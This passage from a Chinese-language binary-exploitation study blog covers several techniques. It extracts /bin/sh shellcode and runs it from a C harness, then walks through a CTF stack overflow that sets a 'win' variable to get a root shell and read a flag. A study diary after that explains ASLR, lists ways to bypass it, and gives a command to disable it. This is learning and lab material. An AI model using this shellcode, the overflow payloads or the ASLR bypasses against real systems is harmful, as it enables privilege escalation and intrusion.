class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> nasm -f elf32 shell.asm -o shell.o</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ld -m elf_i386 -o shell shell.o</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ./shell</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> <span class=\"built_in\">echo</span> u got it</span></span><br><span class=\"line\">u got it</span><br></pre></td></tr></table></figure>\n\n<p>成功了，使用objdump提取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ objdump -d shell</span><br><span class=\"line\">shell:     file format elf32-i386</span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\">08048060 &lt;_start&gt;:</span><br><span class=\"line\"> 8048060:   31 c0                   xor    %eax,%eax</span><br><span class=\"line\"> 8048062:   50                      push   %eax</span><br><span class=\"line\"> 8048063:   68 2f 2f 73 68          push   $0x68732f2f</span><br><span class=\"line\"> 8048068:   68 2f 62 69 6e          push   $0x6e69622f</span><br><span class=\"line\"> 804806d:   89 e3                   mov    %esp,%ebx</span><br><span class=\"line\"> 804806f:   50                      push   %eax</span><br><span class=\"line\"> 8048070:   53                      push   %ebx</span><br><span class=\"line\"> 8048071:   89 e1                   mov    %esp,%ecx</span><br><span class=\"line\"> 8048073:   31 d2                   xor    %edx,%edx</span><br><span class=\"line\"> 8048075:   b0 0b                   mov    $0xb,%al</span><br><span class=\"line\"> 8048077:   cd 80                   int    $0x80</span><br></pre></td></tr></table></figure>\n\n<p>这样就提取到了,下面可以写个c程序验证一下。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">include &lt;stdio.h&gt;</span></span><br><span class=\"line\">char shellcode[]=&quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80&quot;;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    void (*fp) (void);</span><br><span class=\"line\">    fp=(void *)shellcode;</span><br><span class=\"line\">    fp();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> gcc auth.c -fno-stack-protector -o auth -z execstack -m32</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ./auth</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> <span class=\"built_in\">echo</span> u got it</span></span><br><span class=\"line\">u got it</span><br></pre></td></tr></table></figure>\n\n<p><strong>栈溢出之篡改邻近变量</strong></p>\n<ol>\n<li>通过-fno-stack-protector和-m32参数从gcc编译stack0.c文件。</li>\n<li>运行编译后的程序，通过缓冲区溢出修改与字符串数组相邻的变量，得到输出”you     have changed the ‘modified’ variable”</li>\n<li>运行stack1程序，通过栈溢出得到输出”you     have correctly got the variable to the right value”</li>\n</ol>\n<p>缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</p>\n<p><strong>栈溢出之ShellCode简例</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> *<span class=\"title\">pwnthis</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [sp+0h] [bp-48h]@1</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> gets(&amp;s);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">win</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;code flow successfully changed&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:08048454 ; ==== S U B R O U T I N E ==========================================================================</span><br><span class=\"line\">.text:08048454</span><br><span class=\"line\">.text:08048454 ; Attributes: bp-based frame</span><br><span class=\"line\">.text:08048454</span><br><span class=\"line\">.text:08048454                 public pwnthis</span><br><span class=\"line\">.text:08048454 pwnthis         proc near               ; CODE XREF: main+11\u0019p</span><br><span class=\"line\">.text:08048454</span><br><span class=\"line\">.text:08048454 s               = byte ptr -48h</span><br><span class=\"line\">.text:08048454</span><br><span class=\"line\">.text:08048454                 push    ebp</span><br><span class=\"line\">.text:08048455                 mov     ebp, esp</span><br><span class=\"line\">.text:08048457                 sub     esp, 48h</span><br><span class=\"line\">.text:0804845A                 sub     esp, 0Ch</span><br><span class=\"line\">.text:0804845D                 lea     eax, [ebp+s]</span><br><span class=\"line\">.text:08048460                 push    eax             ; s</span><br><span class=\"line\">.text:08048461                 call    _gets</span><br><span class=\"line\">.text:08048466                 add     esp, 10h</span><br><span class=\"line\">.text:08048469                 nop</span><br><span class=\"line\">.text:0804846A                 leave</span><br><span class=\"line\">.text:0804846B                 retn</span><br><span class=\"line\">.text:0804846B pwnthis         endp</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>pwnthis()函数中有且仅有一个危险函数gets(&amp;s);,目标仍然是跳转到函数win()上获得输出code flow successfully changed。</p>\n<p>在IDA pro中双击 char s查看栈的结构</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-00000048 s               db ?</span><br><span class=\"line\">-00000047                 db ? ; undefined</span><br><span class=\"line\">-00000046                 db ? ; undefined</span><br><span class=\"line\">-00000045                 db ? ; undefined</span><br><span class=\"line\">-00000044                 db ? ; undefined</span><br><span class=\"line\">-00000043                 db ? ; undefined</span><br><span class=\"line\">-00000042                 db ? ; undefined</span><br><span class=\"line\">-00000041                 db ? ; undefined</span><br><span class=\"line\">-00000040                 db ? ; undefined</span><br><span class=\"line\">-0000003F                 db ? ; undefined</span><br><span class=\"line\">-0000003E                 db ? ; undefined</span><br><span class=\"line\">-0000003D                 db ? ; undefined</span><br><span class=\"line\">-0000003C                 db ? ; undefined</span><br><span class=\"line\">-0000003B                 db ? ; undefined</span><br><span class=\"line\">-0000003A                 db ? ; undefined</span><br><span class=\"line\">-00000039                 db ? ; undefined</span><br><span class=\"line\">-00000038                 db ? ; undefined</span><br><span class=\"line\">-00000037                 db ? ; undefined</span><br><span class=\"line\">-00000036                 db ? ; undefined</span><br><span class=\"line\">-00000035                 db ? ; undefined</span><br><span class=\"line\">-00000034                 db ? ; undefined</span><br><span class=\"line\">-00000033                 db ? ; undefined</span><br><span class=\"line\">-00000032                 db ? ; undefined</span><br><span class=\"line\">-00000031                 db ? ; undefined</span><br><span class=\"line\">-00000030                 db ? ; undefined</span><br><span class=\"line\">-0000002F                 db ? ; undefined</span><br><span class=\"line\">-0000002E                 db ? ; undefined</span><br><span class=\"line\">-0000002D                 db ? ; undefined</span><br><span class=\"line\">-0000002C                 db ? ; undefined</span><br><span class=\"line\">-0000002B                 db ? ; undefined</span><br><span class=\"line\">-0000002A                 db ? ; undefined</span><br><span class=\"line\">-00000029                 db ? ; undefined</span><br><span class=\"line\">-00000028                 db ? ; undefined</span><br><span class=\"line\">-00000027                 db ? ; undefined</span><br><span class=\"line\">-00000026                 db ? ; undefined</span><br><span class=\"line\">-00000025                 db ? ; undefined</span><br><span class=\"line\">-00000024                 db ? ; undefined</span><br><span class=\"line\">-00000023                 db ? ; undefined</span><br><span class=\"line\">-00000022                 db ? ; undefined</span><br><span class=\"line\">-00000021                 db ? ; undefined</span><br><span class=\"line\">-00000020                 db ? ; undefined</span><br><span class=\"line\">-0000001F                 db ? ; undefined</span><br><span class=\"line\">-0000001E                 db ? ; undefined</span><br><span class=\"line\">-0000001D                 db ? ; undefined</span><br><span class=\"line\">-0000001C                 db ? ; undefined</span><br><span class=\"line\">-0000001B                 db ? ; undefined</span><br><span class=\"line\">-0000001A                 db ? ; undefined</span><br><span class=\"line\">-00000019                 db ? ; undefined</span><br><span class=\"line\">-00000018                 db ? ; undefined</span><br><span class=\"line\">-00000017                 db ? ; undefined</span><br><span class=\"line\">-00000016                 db ? ; undefined</span><br><span class=\"line\">-00000015                 db ? ; undefined</span><br><span class=\"line\">-00000014                 db ? ; undefined</span><br><span class=\"line\">-00000013                 db ? ; undefined</span><br><span class=\"line\">-00000012                 db ? ; undefined</span><br><span class=\"line\">-00000011                 db ? ; undefined</span><br><span class=\"line\">-00000010                 db ? ; undefined</span><br><span class=\"line\">-0000000F                 db ? ; undefined</span><br><span class=\"line\">-0000000E                 db ? ; undefined</span><br><span class=\"line\">-0000000D                 db ? ; undefined</span><br><span class=\"line\">-0000000C                 db ? ; undefined</span><br><span class=\"line\">-0000000B                 db ? ; undefined</span><br><span class=\"line\">-0000000A                 db ? ; undefined</span><br><span class=\"line\">-00000009                 db ? ; undefined</span><br><span class=\"line\">-00000008                 db ? ; undefined</span><br><span class=\"line\">-00000007                 db ? ; undefined</span><br><span class=\"line\">-00000006                 db ? ; undefined</span><br><span class=\"line\">-00000005                 db ? ; undefined</span><br><span class=\"line\">-00000004                 db ? ; undefined</span><br><span class=\"line\">-00000003                 db ? ; undefined</span><br><span class=\"line\">-00000002                 db ? ; undefined</span><br><span class=\"line\">-00000001                 db ? ; undefined</span><br><span class=\"line\">+00000000  s              db 4 dup(?)</span><br><span class=\"line\">+00000004  r              db 4 dup(?)</span><br></pre></td></tr></table></figure>\n\n<p>其中 48处的s是指字符数组s，00处的s指保存在栈上的寄存器，r指的是返回地址，我们的目标就是覆盖返回地址，使函数在执行ret指令时，将我们覆盖的返回地址的值pop弹出到eip，从而改变程序的执行流。</p>\n<p>堆栈是一块保存数据的连续内存。 一个名为堆栈指针(SP)的寄存器指向堆栈的顶部。 堆栈的底部在一个固定的地址。 堆栈的大小在运行时由内核动态地调整。 CPU实现指令 PUSH和POP， 向堆栈中添加元素和从中移去元素。 堆栈由逻辑堆栈帧组成。 当调用函数时逻辑堆栈帧被压入栈中， 当函数返回时逻辑 堆栈帧被从栈中弹出。 堆栈帧包括函数的参数， 函数的局部变量， 以及恢复前一个堆栈 帧所需要的数据， 其中包括在函数调用时指令指针(IP)的值。 堆栈既可以向下增长(向内存低地址)也可以向上增长， 这依赖于具体的实现。 在我 们的例子中， 堆栈是向下增长的。 这是很多计算机的实现方式， 包括Intel， Motorola， SPARC和MIPS处理器。 堆栈指针(SP)也是依赖于具体实现的。 它可以指向堆栈的最后地址， 或者指向堆栈之后的下一个空闲可用地址。 在我们的讨论当中， SP指向堆栈的最后地址。 除了堆栈指针(SP指向堆栈顶部的的低地址)之外， 为了使用方便还有指向帧内固定 地址的指针叫做帧指针(FP)。 有些文章把它叫做局部基指针(LB-local base pointer)。 从理论上来说， 局部变量可以用SP加偏移量来引用。 然而， 当有字被压栈和出栈后， 这 些偏移量就变了。 尽管在某些情况下编译器能够跟踪栈中的字操作， 由此可以修正偏移 量， 但是在某些情况下不能。 而且在所有情况下， 要引入可观的管理开销。 而且在有些 机器上， 比如Intel处理器， 由SP加偏移量访问一个变量需要多条指令才能实现。 因此， 许多编译器使用第二个寄存器， FP， 对于局部变量和函数参数都可以引用， 因为它们到FP的距离不会受到PUSH和POP操作的影响。 在Intel CPU中， BP(EBP)用于这 个目的。 在Motorola CPU中， 除了A7(堆栈指针SP)之外的任何地址寄存器都可以做FP。 考虑到我们堆栈的增长方向， 从FP的位置开始计算， 函数参数的偏移量是正值， 而局部 变量的偏移量是负值。 当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以 恢复)。 然后它把SP复制到FP， 创建新的FP， 把SP向前移动为局部变量保留空间。 这称为 例程的序幕(prolog)工作。 当例程退出时， 堆栈必须被清除干净， 这称为例程的收尾 (epilog)工作。 Intel的ENTER和LEAVE指令， Motorola的LINK和UNLINK指令， 都可以用于 有效地序幕和收尾工作。</p>\n<p><strong>步骤1：</strong> 程序源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">vuln</span><span class=\"params\">(<span class=\"keyword\">int</span> tmp, <span class=\"keyword\">char</span> *str)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> win = tmp;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buf[<span class=\"number\">64</span>];</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buf, str);</span><br><span class=\"line\">    dump_stack((<span class=\"keyword\">void</span> **) buf, <span class=\"number\">23</span>, (<span class=\"keyword\">void</span> **) &amp;tmp);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;win = %d\\n&quot;</span>, win);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (win == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        execl(<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;sh&quot;</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Sorry, you lose.\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc != <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Usage: stack_overwrite [str]\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"keyword\">uid_t</span> euid = geteuid();</span><br><span class=\"line\">    setresuid(euid, euid, euid);</span><br><span class=\"line\">    vuln(<span class=\"number\">0</span>, argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>步骤2：</strong> 首先，我们打开平台，点击操作机，点击通过web ssh登录进入控制台。</p>\n<p><strong>步骤3：</strong> 我们输入ls，查看当前文件夹下有三个文件，我们尝试cat flag，发现权限缺失，所以我们尝试利用overflow1-3948d17028101c40的漏洞进行攻击。</p>\n<p><strong>步骤4：</strong> 首先，我们的输入是程序的命令行参数。第二，如果我们可以设置win变量等于1，我们会得到一个shell！ 让我们进行cat flag。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ./overflow1-3948d17028101c40 $(python -c &#x27;print &quot;A&quot;*64 + &quot;B&quot;&#x27;)</span><br><span class=\"line\">Stack dump:</span><br><span class=\"line\">0xffa81994: 0xffa82845 (second argument)</span><br><span class=\"line\">0xffa81990: 0x00000000 (first argument)</span><br><span class=\"line\">0xffa8198c: 0x0804870f (saved eip)</span><br><span class=\"line\">0xffa81988: 0xffa819b8 (saved ebp)</span><br><span class=\"line\">0xffa81984: 0xf779c000</span><br><span class=\"line\">0xffa81980: 0xf76a8a00</span><br><span class=\"line\">0xffa8197c: 0x00000042</span><br><span class=\"line\">0xffa81978: 0x41414141</span><br><span class=\"line\">0xffa81974: 0x41414141</span><br><span class=\"line\">0xffa81970: 0x41414141</span><br><span class=\"line\">0xffa8196c: 0x41414141</span><br><span class=\"line\">0xffa81968: 0x41414141</span><br><span class=\"line\">0xffa81964: 0x41414141</span><br><span class=\"line\">0xffa81960: 0x41414141</span><br><span class=\"line\">0xffa8195c: 0x41414141</span><br><span class=\"line\">0xffa81958: 0x41414141</span><br><span class=\"line\">0xffa81954: 0x41414141</span><br><span class=\"line\">0xffa81950: 0x41414141</span><br><span class=\"line\">0xffa8194c: 0x41414141</span><br><span class=\"line\">0xffa81948: 0x41414141</span><br><span class=\"line\">0xffa81944: 0x41414141</span><br><span class=\"line\">0xffa81940: 0x41414141</span><br><span class=\"line\">0xffa8193c: 0x41414141 (beginning of buffer)</span><br><span class=\"line\">win = 66</span><br><span class=\"line\">Sorry, you lose.</span><br></pre></td></tr></table></figure>\n\n<p><strong>步骤5：</strong> 你会看到，如果我们填满了缓冲区（“A”* 64）和一个”B”字母，win的值会改变。 对于那些不知道的人，“B”的ascii值是66，这意味着我们可以控制win变量。 我们所要做的就是提交一个ascii值为1的字符。由于这是不可打印的，我们将在python中使用转义序列。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ./overflow1-3948d17028101c40 $(python -c &#x27;print &quot;A&quot;*64 + &quot;\\x01&quot;&#x27;)</span><br><span class=\"line\">Stack dump:</span><br><span class=\"line\">0xff828874: 0xff829848 (second argument)</span><br><span class=\"line\">0xff828870: 0x00000000 (first argument)</span><br><span class=\"line\">0xff82886c: 0x0804870f (saved eip)</span><br><span class=\"line\">0xff828868: 0xff828898 (saved ebp)</span><br><span class=\"line\">0xff828864: 0xf77b7000</span><br><span class=\"line\">0xff828860: 0xf76c3aa7</span><br><span class=\"line\">0xff82885c: 0x00000001</span><br><span class=\"line\">0xff828858: 0x41414141</span><br><span class=\"line\">0xff828854: 0x41414141</span><br><span class=\"line\">0xff828850: 0x41414141</span><br><span class=\"line\">0xff82884c: 0x41414141</span><br><span class=\"line\">0xff828848: 0x41414141</span><br><span class=\"line\">0xff828844: 0x41414141</span><br><span class=\"line\">0xff828840: 0x41414141</span><br><span class=\"line\">0xff82883c: 0x41414141</span><br><span class=\"line\">0xff828838: 0x41414141</span><br><span class=\"line\">0xff828834: 0x41414141</span><br><span class=\"line\">0xff828830: 0x41414141</span><br><span class=\"line\">0xff82882c: 0x41414141</span><br><span class=\"line\">0xff828828: 0x41414141</span><br><span class=\"line\">0xff828824: 0x41414141</span><br><span class=\"line\">0xff828820: 0x41414141</span><br><span class=\"line\">0xff82881c: 0x41414141 (beginning of buffer)</span><br><span class=\"line\">win = 1</span><br><span class=\"line\">$</span><br></pre></td></tr></table></figure>\n\n<p><strong>步骤6：</strong> 之后，我们输入id，发现我们已经拿到了root的权限。然后我们再cat flag，这次便成功获取到flag了。</p>\n"},{"_content":"```\n学习日记3\n```\n\n**ASLR**\n\n地址空间配置随机载入（Address Space Layout Randomization，ASLR，又称地址空间配置随机化、地址空间布局随机化）是一种防范内存损坏漏洞被利用的计算机安全技术。\n\n地址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。\n\n传统攻击：\n\n- 基础栈溢出：需要定位shellcode\n- return-to-libc：     需要libc地址\n\n开启ASLR后：libc基址不再固定，shellcode的地址（栈、bss等地址）在每一次运行时也相应地发生改变，传统的地址硬编码的攻击基本失效。\n\n| **Aspect** | **aslr**                       |\n| ---------- | ------------------------------ |\n| 表现       | 优异-每次加载都会随机          |\n| 发布       | 获得内核支持，不需要重新编译   |\n| 兼容性     | 对安全应用程序透明（位置独立） |\n| 保护效果   | 64位下效果显著                 |\n\n查看当前ASLR状态：\n\n```shell\n$ cat /proc/sys/kernel/randomize_va_space\n```\n\n 2\n\n该值为：\n\n- 1: 随机化堆栈，VDSO，共享内存区域的位置\n- 2: 同上，并添加数据段的随机\n- 0: 禁用ASLR\n\nlinux关闭ASLR:\n\n```shell\n# echo 0 >> /proc/sys/kernel/randomize_va_space\n```\n\n**ASLR Bypass**\n\n- leak address\n- 暴力破解\n- 非随机化内存\n- ret2text\n- 函数指针\n- GOT表劫持（不依赖libc空间）\n- rewrite GOT[]\n- ret2dl-resolve\n\n- 栈juggling\n- ret2ret\n- ret2pop\n- ret2eax\n\n**ASLR Bypass之leak address**\n\n开启ASLR后无法通过控制eip来直接输出地址。\n\n但是可以通过覆盖相关数据来间接地泄露地址。\n\n如：\n\n- 输出内容中是否有地址信息\n- 如：精心设计的输出、未初始化的变量等\n- 覆盖输出函数的指针\n- 如：覆盖printf()的参数\n- 覆盖输出的缓冲区大小\n- 如：覆盖write(),memcpy()的参数\n\n**ASLR Bypass之暴力绕过**\n\n- 使用大量NOP填充shellcode，提高地址命中率，并暴力搜索栈的地址\n            payload： nop*n + shellcode\n\n### **ASLR Bypass之非随机化内存**\n\nret2text\n\ntext段有可以执行的程序代码，并且地址不会被除PIE之外的ASLR随机化,可以将程序执行流劫持到意外的（但已经存在）的程序函数\n\n**函数指针劫持**\n\n覆盖一个函数指针指向：\n\n- 程序函数\n- 程序连接表中的其他库函数\n\n```c\nint secret(char *input){... }\nint chk_pwd(char *input){... }\nint main()\n{\nint (*ptr)(char *input);\nchar buf[8];\nptr = &chk_pwd;\nstrncpy(buf,argv[1],12);\nprintf(\"hello %s!\\n\",buf);\n(*ptr)(argv[2]);\n}\n```\n\n**ASLR Bypass之GOT劫持**\n\n- 第一次运行函数\n  函数先跳转到plt表，从plt表跳转到got表，got表中存储的是该函数在plt表中的地址+4偏移，于是又跳转到plt下，执行push     xx，jmp <got [0]>，其中push是给检索函数提供参数，jmp到got表的检索函数，此时got表中就会填充函数的准确地址\n\n```c\n#include <stdio.h>\nint main()\n{\nprintf(\"hello world\\n\");\nreturn 0;\n}\n```\n\n```assembly\npwndbg> disass main\nDump of assembler code for function main:\n0x0000000000400526 <+0>:\tpush   rbp\n0x0000000000400527 <+1>:\tmov    rbp,rsp\n0x000000000040052a <+4>:\tmov    edi,0x4005c4\n0x000000000040052f <+9>:\tcall   0x400400 <puts@plt>\n0x0000000000400534 <+14>:\tmov    eax,0x0\n0x0000000000400539 <+19>:\tpop    rbp\n0x000000000040053a <+20>:\tret\nEnd of assembler dump.\npwndbg> disass *0x400400\nNo function contains specified address.\npwndbg> disass 0x400400\nDump of assembler code for function puts@plt:\n0x0000000000400400 <+0>:\tjmp    QWORD PTR [rip+0x200c12]        # 0x601018\n0x0000000000400406 <+6>:\tpush   0x0\n0x000000000040040b <+11>:\tjmp    0x4003f0\nEnd of assembler dump.\npwndbg> x 0x601018\n0x601018:\t0x00400406\n```\n\n**改写GOT表项**\n\n- GOT中存储的是函数在内存中的真实地址\n- 利用方法\n- 覆盖got表中的地址，当程序运行某一个函数，实际执行的是另一个我们覆盖的函数。\n- e.g.:覆盖printf()为system()\n\n**ret2dl-resolve（32位为例）**\n\nelf.h:\n\n\\#define reloc_offset reloc_arg\n\n- 计算重定位条目基址 Elf32_Rel  * reloc = JMPREL + reloc_offset;\n- 计算符号表条目基址 Elf32_Sym  * sym = &SYMTAB[ ELF32_R_SYM (reloc->r_info) ];\n- 获得符号名称 const char  *symname = strtab + sym->st_name;\n- 通过符号名称symname搜索动态库，将地址填入function@got（即&GOT+reloc_offset）\n- 